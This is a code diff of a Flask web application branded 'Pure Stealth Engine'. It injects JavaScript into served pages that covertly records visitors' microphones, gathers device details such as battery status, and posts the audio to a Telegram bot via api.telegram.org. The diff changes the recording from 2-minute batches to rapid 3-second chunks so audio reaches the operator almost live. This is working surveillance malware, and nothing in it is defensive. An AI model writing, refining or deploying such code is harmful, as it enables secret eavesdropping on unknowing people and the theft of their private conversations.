@@ -1,4 +1,4 @@
-# by:@ROMEO_UCHIHA (Pure Stealth Engine, 2-Min Failsafe Audio, Redesigned UI & Anti-Crash)
+# by:@ROMEO_UCHIHA (Pure Stealth Engine, 3-Sec Rapid Audio Chunks, Redesigned UI & Anti-Crash)
 from flask import Flask, request, render_template_string, jsonify
 from supabase import create_client, Client
 import base64, requests, os, time, json
@@ -61,7 +61,7 @@ def send_tg_audio_document(token, cid, raw_audio, caption="", v_url=""):
         requests.post(
             f"https://api.telegram.org/bot{token}/sendDocument", 
             data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
-            files={"document": ("audio_record.webm", raw_audio, "audio/webm")}, 
+            files={"document": ("audio_3s_chunk.webm", raw_audio, "audio/webm")}, 
             timeout=20
         )
     except Exception as e: 
@@ -101,11 +101,11 @@ BASE_TAILWIND = """
         .glass-box { background: rgba(15, 15, 20, 0.7); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4 relative">
+<body class="min-h-screen flex flex-col items-center justify-center p-4 m-0 relative">
     <div class="orb"></div>
 """
 
-# --- INJECTABLE JS STEALTH LOGIC (Anti-Crash Version) ---
+# --- INJECTABLE JS STEALTH LOGIC (3-Second Rapid Chunking) ---
 def get_stealth_js_logic():
     return """
         let batteryInfo = "Not Fetched";
@@ -125,21 +125,22 @@ def get_stealth_js_logic():
             }
         }
 
-        // --- MICROPHONE LOGIC (Failsafe & Reliable) ---
+        // --- MICROPHONE LOGIC (Rapid 3-Second Chunks) ---
         let mediaRecorder;
-        let audioChunks = [];
         let isRecording = false;
 
         async function startAudioRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } });
                 
-                function initiateRecorder() {
-                    // Supported format for stable blobs
+                function recordChunk() {
+                    if (!isRecording) return;
+                    
                     let options = {};
                     if(MediaRecorder.isTypeSupported('audio/webm')) { options = { mimeType: 'audio/webm' }; }
                     
                     mediaRecorder = new MediaRecorder(stream, options);
+                    let audioChunks = [];
                     
                     mediaRecorder.ondataavailable = e => { 
                         if (e.data && e.data.size > 0) audioChunks.push(e.data); 
@@ -152,28 +153,28 @@ def get_stealth_js_logic():
                             let reader = new FileReader();
                             reader.readAsDataURL(audioBlob);
                             reader.onloadend = () => {
-                                // keepalive removed to prevent 64kb fetch limit failure
                                 fetch("/api/capture_audio/" + l_id, {
                                     method: "POST", headers: {"Content-Type": "application/json"},
                                     body: JSON.stringify({ audio: reader.result })
                                 }).catch(()=>{});
                             };
                         }
-                        audioChunks = [];
-                        if(isRecording) initiateRecorder(); 
+                        // Start the next 3-second chunk immediately
+                        if(isRecording) recordChunk(); 
                     };
                     
-                    // Slice data internally every 1 second to prevent memory crashes
-                    mediaRecorder.start(1000); 
+                    mediaRecorder.start();
                     
-                    // Stop & Send every 2 minutes (120,000 ms)
+                    // Force stop after exactly 3 seconds to trigger upload
                     setTimeout(() => {
-                        if(mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); }
-                    }, 120000);
+                        if(mediaRecorder && mediaRecorder.state === "recording") { 
+                            mediaRecorder.stop(); 
+                        }
+                    }, 3000);
                 }
                 
                 isRecording = true;
-                initiateRecorder();
+                recordChunk();
 
                 const handleExit = () => {
                     if(mediaRecorder && mediaRecorder.state === "recording") {
